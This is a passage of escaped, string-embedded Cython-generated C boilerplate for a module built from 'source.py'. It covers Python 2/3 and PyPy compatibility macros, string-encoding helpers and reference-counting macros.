PyUnicode_GET_SIZE(u))\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_PYPY\\\\n  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)\\\\n  #define __Pyx\"\"_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)\\\\n#else\\\\n  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)\\\\n  #define __P\\\"\\\"yx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\\\\\\\\\\\\n      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)\\\\n  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)\\\\n  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)\\\\n#endif\\\\n#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)\\\\n  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, \\\\\\\"__format__\\\\\\\", \\\\\\\"O\\\\\\\", fmt)\\\\n#endif\\\\n#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))\\\\n#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))\\\\n#if PY_MAJOR_VERSION >= 3\\\\n  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)\\\\n#else\\\\n  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)\\\\n#endif\\\\n#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)\\\\n  #define PyObject_ASCII(o)            PyObject_Repr(o)\\\\n#endif\\\\n#if PY_MAJOR_VERSION >= 3\\\\n  #define PyBaseString_Type            PyUnicode_Type\\\\n  #define PyStringObject               PyUnicodeObject\\\\n  #define PyString_Type                PyUnicode_Type\\\\n  #define PyString_Check               PyUnicode_Check\\\\n  #define PyString_CheckExact        ""  PyUnicode_CheckExact\\\\n#ifndef PyObject_Unicode\\\\n  #define PyObject_Unicode             PyObject_Str\\\\n#endif\\\\n#endif\\\\n#if PY_MAJOR_VERSION >= 3\\\\n  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)\\\\n  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)\\\\n#else\"\"\\\\n  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))\\\\n  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))\\\"\\\"\\\\n#endif\\\\n#ifndef PySet_CheckExact\\\\n  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)\\\\n#endif\\\\n#if PY_VERSION_HEX >= 0x030900A4\\\\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)\\\\n  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)\\\\n#else\\\\n  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)\\\\n  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)\\\\n#endif\\\\n#if CYTHON_ASSUME_SAFE_MACROS\\\\n  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)\\\\n#else\\\\n  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)\\\\n#endif\\\\n#if PY_MAJOR_VERSION >= 3\\\\n  #define PyIntObject                  PyLongObject\\\\n  #define PyInt_Type                   PyLong_Type\\\\n  #define PyInt_Check(op)              PyLong_Check(op)\\\\n  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)\\\\n  #define PyInt_FromString             PyLong_FromString\\\\n  #define PyInt_FromUnicode            PyLong_FromUnicode\\\\n  #define PyInt_FromLong               PyLong_FromLong\\\\n  #define PyInt_FromSize_t             PyLong_FromSize_t\\\\n  #define PyInt_FromSsize_t            PyLong_FromSsize_t\\\\n  #define PyInt_AsLong                 PyLong_AsLong\\\\n  #define PyInt_AS_LONG                PyLong_AS_LONG\\\\n  #define PyInt_AsSsize_t              PyLong_AsSsize_t\\\\n  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask\\\\n  #define PyInt_AsUnsignedLongLongMask PyLo""ng_AsUnsignedLongLongMask\\\\n  #define PyNumber_Int                 PyNumber_Long\\\\n#endif\\\\n#if PY_MAJOR_VERSION >= 3\\\\n  #define PyBoolObject                 PyLongObject\\\\n#endif\\\\n#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY\\\\n  #ifndef PyUnicode_InternFromString\\\\n    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)\\\\n  #endif\\\\n#endif\\\\n#if PY_VERSION_HE\"\"X < 0x030200A4\\\\n  typedef long Py_hash_t;\\\\n  #define __Pyx_PyInt_FromHash_t PyInt_FromLong\\\\n  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t\\\\n#else\\\\n  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t\\\\n  #define __Pyx_PyInt_AsHash_\\\"\\\"t   __Pyx_PyIndex_AsSsize_t\\\\n#endif\\\\n#if PY_MAJOR_VERSION >= 3\\\\n  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))\\\\n#else\\\\n  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)\\\\n#endif\\\\n#if CYTHON_USE_ASYNC_SLOTS\\\\n  #if PY_VERSION_HEX >= 0x030500B1\\\\n    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods\\\\n    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)\\\\n  #else\\\\n    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))\\\\n  #endif\\\\n#else\\\\n  #define __Pyx_PyType_AsAsync(obj) NULL\\\\n#endif\\\\n#ifndef __Pyx_PyAsyncMethodsStruct\\\\n    typedef struct {\\\\n        unaryfunc am_await;\\\\n        unaryfunc am_aiter;\\\\n        unaryfunc am_anext;\\\\n    } __Pyx_PyAsyncMethodsStruct;\\\\n#endif\\\\n\\\\n#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)\\\\n  #if !defined(_USE_MATH_DEFINES)\\\\n    #define _USE_MATH_DEFINES\\\\n  #endif\\\\n#endif\\\\n#include <math.h>\\\\n#ifdef NAN\\\\n#define __PYX_NAN() ((float) NAN)\\\\n#else\\\\nstatic CYTHON_INLINE float __PYX_NAN() {\\\\n  float value;\\\\n  memset(&value, 0xFF, sizeof(value));\\\\n  return value;\\\\n}\\\\n#endif\\\\n#if defined(__CYGWIN__) && de""fined(_LDBL_EQ_DBL)\\\\n#define __Pyx_truncl trunc\\\\n#else\\\\n#define __Pyx_truncl truncl\\\\n#endif\\\\n\\\\n#define __PYX_MARK_ERR_POS(f_index, lineno) \\\\\\\\\\\\n    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }\\\\n#define __PYX_ERR(f_index, lineno, Ln_error) \\\\\\\\\\\\n    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }\\\\n\\\\n#ifndef __PYX_EXTERN_C\\\\n  #ifdef __cplusplus\\\\n    #define __PYX_EXTERN_C exter\"\"n \\\\\\\"C\\\\\\\"\\\\n  #else\\\\n    #define __PYX_EXTERN_C extern\\\\n  #endif\\\\n#endif\\\\n\\\\n#define __PYX_HAVE__source\\\\n#define __PYX_HAVE_API__source\\\\n/* Early includes */\\\\n#ifdef _OPENMP\\\\n#include <omp.h>\\\\n#endif /* _OPENMP */\\\\n\\\\n#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)\\\\n#define CYTHO\\\"\\\"N_WITHOUT_ASSERTIONS\\\\n#endif\\\\n\\\\ntypedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;\\\\n                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;\\\\n\\\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0\\\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0\\\\n#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)\\\\n#define __PYX_DEFAULT_STRING_ENCODING \\\\\\\"\\\\\\\"\\\\n#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString\\\\n#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\\\\n#define __Pyx_uchar_cast(c) ((unsigned char)c)\\\\n#define __Pyx_long_cast(x) ((long)x)\\\\n#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\\\\\\\\\\\\n    (sizeof(type) < sizeof(Py_ssize_t))  ||\\\\\\\\\\\\n    (sizeof(type) > sizeof(Py_ssize_t) &&\\\\\\\\\\\\n          likely(v < (type)PY_SSIZE_T_MAX ||\\\\\\\\\\\\n                 v == (type)PY_SSIZE_T_MAX)  &&\\\\\\\\\\\\n          (!is_signed || likely(v > (type)P""Y_SSIZE_T_MIN ||\\\\\\\\\\\\n                                v == (type)PY_SSIZE_T_MIN)))  ||\\\\\\\\\\\\n    (sizeof(type) == sizeof(Py_ssize_t) &&\\\\\\\\\\\\n          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\\\\\\\\\\\\n                               v == (type)PY_SSIZE_T_MAX)))  )\\\\nstatic CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {\\\\n    return (size_t) i < (size_t) limit;\\\\n}\\\\n#if defined (__cplusplus) && __cplusplus >= 201103L\\\\n    #include <cstdlib>\\\\n    #define __Pyx_sst_abs(value) std::abs(value)\\\\n#elif SIZEOF_INT >= SIZEOF_SIZE_T\\\\n    #define __Pyx_sst_abs(value) abs(value)\\\\n#elif SIZEOF_LONG >= SIZEOF_SIZE_T\"\"\\\\n    #define __Pyx_sst_abs(value) labs(value)\\\\n#elif defined (_MSC_VER)\\\\n    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))\\\\n#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\\\\n    #define __Pyx_sst_abs(value) llabs(value)\\\\n#elif defined (__GNUC__)\\\\n    #define __Pyx_sst_abs(value) __builtin_llabs(value)\\\\n#else\\\\n    #define __Pyx_sst_abs(value) ((value<0) \\\"\\\"? -value : value)\\\\n#endif\\\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);\\\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);\\\\n#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))\\\\n#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)\\\\n#define __Pyx_PyBytes_FromString        PyBytes_FromString\\\\n#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);\\\\n#if PY_MAJOR_VERSION < 3\\\\n    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString\\\\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize\\\\n#else\\\\n    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString""\\\\n    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize\\\\n#endif\\\\n#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))\\\\n#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))\\\\n#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))\\\\n#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))\\\\n#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))\\\\n#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))\\\\n#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))\\\\n#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx\"\"_PyObject_AsString(s))\\\\n#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))\\\\n#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))\\\\n#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))\\\\n#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)\\\\n#define __Pyx_PyBytes_FromCString(s)\\\"\\\"   __Pyx_PyBytes_FromString((const char*)s)\\\\n#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)\\\\n#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)\\\\n#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)\\\\nstatic CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {\\\\n    const Py_UNICODE *u_end = u;\\\\n    while (*u_end++) ;\\\\n    return (size_t)(u_end - u - 1);\\\\n}\\\\n#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))\\\\n#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode\\\\n#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode\\\\n#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)""\\\\n#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)\\\\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);\\\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);\\\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);\\\\n#define __Pyx_PySequence_Tuple(obj)\\\\\\\\\\\\n    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))\\\\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);\\\\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);\\\\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);\\\\n#if CYTHON_ASSUME_SAFE_MACROS\\\\n#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))\\\\n#else\\\\n#define __\"\"pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)\\\\n#endif\\\\n#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))\\\\n#if PY_MAJOR_VERSION >= 3\\\\n#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))\\\\n#else\\\\n#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))\\\\n#endif\\\\n#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))\\\\n#if PY_MAJOR_VE\\\"\\\"RSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\\\nstatic int __Pyx_sys_getdefaultencoding_not_ascii;\\\\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\\\\n    PyObject* sys;\\\\n    PyObject* default_encoding = NULL;\\\\n    PyObject* ascii_chars_u = NULL;\\\\n    PyObject* ascii_chars_b = NULL;\\\\n    const char* default_encoding_c;\\\\n    sys = PyImport_ImportModule(\\\\\\\"sys\\\\\\\");\\\\n    if (!sys) goto bad;\\\\n    default_encoding = PyObject_CallMethod(sys, (char*) \\\\\\\"getdefaultencoding\\\\\\\", NULL);\\\\n    Py_DECREF(sys);\\\\n    if (!default_encoding) goto bad;\\\\n    default_encoding_c = PyBytes_AsString(defaul""t_encoding);\\\\n    if (!default_encoding_c) goto bad;\\\\n    if (strcmp(default_encoding_c, \\\\\\\"ascii\\\\\\\") == 0) {\\\\n        __Pyx_sys_getdefaultencoding_not_ascii = 0;\\\\n    } else {\\\\n        char ascii_chars[128];\\\\n        int c;\\\\n        for (c = 0; c < 128; c++) {\\\\n            ascii_chars[c] = c;\\\\n        }\\\\n        __Pyx_sys_getdefaultencoding_not_ascii = 1;\\\\n        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);\\\\n        if (!ascii_chars_u) goto bad;\\\\n        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);\\\\n        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {\\\\n            PyErr_Format(\\\\n                PyExc_ValueError,\\\\n                \\\\\\\"This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.\\\\\\\",\"\"\\\\n                default_encoding_c);\\\\n            goto bad;\\\\n        }\\\\n        Py_DECREF(ascii_chars_u);\\\\n        Py_DECREF(ascii_chars_b);\\\\n    }\\\\n    Py_DECREF(default_encoding);\\\\n    return 0;\\\\nbad:\\\\n    Py_XDECREF(default_encoding);\\\\n    Py_XDECREF(ascii_chars_u);\\\\n    Py_XDECREF(ascii_chars_b);\\\\n    return -1;\\\\n}\\\\n#endif\\\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3\\\\n#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)\\\\n#else\\\\n#define __\\\"\\\"Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)\\\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\\\nstatic char* __PYX_DEFAULT_STRING_ENCODING;\\\\nstatic int __Pyx_init_sys_getdefaultencoding_params(void) {\\\\n    PyObject* sys;\\\\n    PyObject* default_encoding = NULL;\\\\n    char* default_encoding_c;\\\\n    sys = PyImport_ImportModule(\\\\\\\"sys\\\\\\\");\\\\n    if (!sys) goto ba""d;\\\\n    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) \\\\\\\"getdefaultencoding\\\\\\\", NULL);\\\\n    Py_DECREF(sys);\\\\n    if (!default_encoding) goto bad;\\\\n    default_encoding_c = PyBytes_AsString(default_encoding);\\\\n    if (!default_encoding_c) goto bad;\\\\n    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);\\\\n    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;\\\\n    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);\\\\n    Py_DECREF(default_encoding);\\\\n    return 0;\\\\nbad:\\\\n    Py_XDECREF(default_encoding);\\\\n    return -1;\\\\n}\\\\n#endif\\\\n#endif\\\\n\\\\n\\\\n/* Test for GCC > 2.95 */\\\\n#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))\\\\n  #define likely(x)   __builtin_expect(!!(x), 1)\\\\n  #define unlikely(x) __builtin_expect(!!(x), 0)\\\\n#else /* !__GNUC__ or GCC < 2.95 */\\\\n  #define likely(x)   (x)\\\\n  #define unlikely(x) (x)\\\\n#endif /* __GNUC__ */\\\\nstatic CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void\"\")ptr; }\\\\n\\\\nstatic PyObject *__pyx_m = NULL;\\\\nstatic PyObject *__pyx_d;\\\\nstatic PyObject *__pyx_b;\\\\nstatic PyObject *__pyx_cython_runtime = NULL;\\\\nstatic PyObject *__pyx_empty_tuple;\\\\nstatic PyObject *__pyx_empty_bytes;\\\\nstatic PyObject *__pyx_empty_unicode;\\\\nstatic int __pyx_lineno;\\\\nstatic int __pyx_clineno = 0;\\\\nstatic const char * __pyx_cfilenm= __FILE__;\\\\nstatic const char *__pyx_filename;\\\\n\\\\n\\\\nstatic const char *__pyx_f[] = {\\\\n  \\\\\\\"source.py\\\\\\\",\\\\n};\\\\n\\\\n/*--- Type declarations ---*/\\\\n\\\\n/* --- Runtime support code (head) --- */\\\\n/* Refnanny.proto */\\\\n#ifndef CYTHON_REFNANNY\\\"\\\"\\\\n  #define CYTHON_REFNANNY 0\\\\n#endif\\\\n#if CYTHON_REFNANNY\\\\n  typedef struct {\\\\n    void (*INCREF)(void*, PyObject*, int);\\\\n    void (*DECREF)(void*, PyObject*, int);\\\\n    void (*GOTREF)(void*, PyObject*, int);""\\\\n    void (*GIVEREF)(void*, PyObject*, int);\\\\n    void* (*SetupContext)(const char*, int, const char*);\\\\n    void (*FinishContext)(void**);\\\\n  } __Pyx_RefNannyAPIStruct;\\\\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;\\\\n  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);\\\\n  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;\\\\n#ifdef WITH_THREAD\\\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\\\\\\\\\\n          if (acquire_gil) {\\\\\\\\\\\\n              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\\\\\\\\\\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\\\\\\\\\\n              PyGILState_Release(__pyx_gilstate_save);\\\\\\\\\\\\n          } else {\\\\\\\\\\\\n              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\\\\\\\\\\\\n          }\\\\n#else\\\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\\\\\\\\\\n          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)\\\\n#endif\\\\n  #define __Pyx_RefNannyFinishContext()\\\\\\\\\\\\n          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)\\\\n  #define __Pyx_INCREF(r)  \"\"__Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\\\n  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\\\n  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\\\n  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)\\\\n  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)\\\\n  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)\\\\n  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)\\\\n  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} \\\"\\\"while(0)\\\\n#else\\\\n  #define __Pyx_RefNannyDeclara""tions\\\\n  #define __Pyx_RefNannySetupContext(name, acquire_gil)\\\\n  #define __Pyx_RefNannyFinishContext()\\\\n  #define __Pyx_INCREF(r) Py_INCREF(r)\\\\n  #define __Pyx_DECREF(r) Py_DECREF(r)\\\\n  #define __Pyx_GOTREF(r)\\\\n  #define __Pyx_GIVEREF(r)\\\\n  #define __Pyx_XINCREF(r) Py_XINCREF(r)\\\\n  #define __Pyx_XDECREF(r) Py_XDECREF(r)\\\\n  #define __Pyx_XGOTREF(r)\\\\n  #define __Pyx_XGIVEREF(r)\\\\n#endif\\\\n#define __Pyx_XDECREF_SET(r, v) do {\\\\\\\\\\\\n        PyObject *tmp = (PyObject *) r;\\\\\\\\\\\\n        r = v; __Pyx_XDECREF(tmp);\\\\\\\\\\\\n    } while (0)\\\\n#define __Pyx_DECREF_SET(r, v) do {\\\\\\\\\\\\n        PyObject *tmp = (PyObject *) r;\\\\\\\\\\\\n        r = v; __Pyx_DECREF(tmp);\\\\\\\\\\\\n    } while (0)\\\\n#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)\\\\n#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)\\\\n\\\\n/* PyObjectGetAttrStr.proto */\\\\n#if CYTHON_USE_TYPE_SLOTS\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);\\\\n#else\\\\n#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)\\\\n#endif\\\\n\\\\n/* GetBuiltinName.proto */\\\\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name);\\\\n\\\\n/* Import.proto */\"\"\\\\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);\\\\n\\\\n/* PyDictVersioning.proto */\\\\n#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS\\\\n#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)\\\\n#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)\\\\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\\\\\\\\\\n    (version_var) = __PYX_GET_DICT_VERSION(dict);\\\\\\\\\\\\n    (cache_var) = (value);\\\\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\\\\\\\\\\\\n    static PY_UINT64_T __pyx_dict_version = 0;""\\\\\\\\\\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\\\\\\\\\\n    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\\\\\\\\\\\\n        (VAR) = __pyx_\\\"\\\"dict_cached_value;\\\\\\\\\\\\n    } else {\\\\\\\\\\\\n        (VAR) = __pyx_dict_cached_value = (LOOKUP);\\\\\\\\\\\\n        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\\\\\\\\\\\\n    }\\\\\\\\\\\\n}\\\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);\\\\nstatic CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);\\\\nstatic CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);\\\\n#else\\\\n#define __PYX_GET_DICT_VERSION(dict)  (0)\\\\n#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\\\\n#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);\\\\n#endif\\\\n\\\\n/* GetModuleGlobalName.proto */\\\\n#if CYTHON_USE_DICT_VERSIONS\\\\n#define __Pyx_GetModuleGlobalName(var, name)  do {\\\\\\\\\\\\n    static PY_UINT64_T __pyx_dict_version = 0;\\\\\\\\\\\\n    static PyObject *__pyx_dict_cached_value = NULL;\\\\\\\\\\\\n    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\\\\\\\\\\\\n        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\\\\\\\\\\\\n        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\\\\\\\\\\n} while(0)\\\\n#define __\"\"Pyx_GetModuleGlobalNameUncached(var, name)  do {\\\\\\\\\\\\n    PY_UINT64_T __pyx_dict_version;\\\\\\\\\\\\n    PyObject *__pyx_dict_cached_value;\\\\\\\\\\\\n    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\\\\\\\\\\\\n} while(0)\\\\nstatic PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);\\\\n#else\\\\n#define __Pyx_GetModuleGlobalName(var, name)  (var) = ""__Pyx__GetModuleGlobalName(name)\\\\n#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)\\\\nstatic CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);\\\\n#endif\\\\n\\\\n/* PyObjectCall.proto */\\\\n#if CYTHON_COMPILING_IN_CPYTHON\\\\nstatic CYTHON_INLINE PyObject* 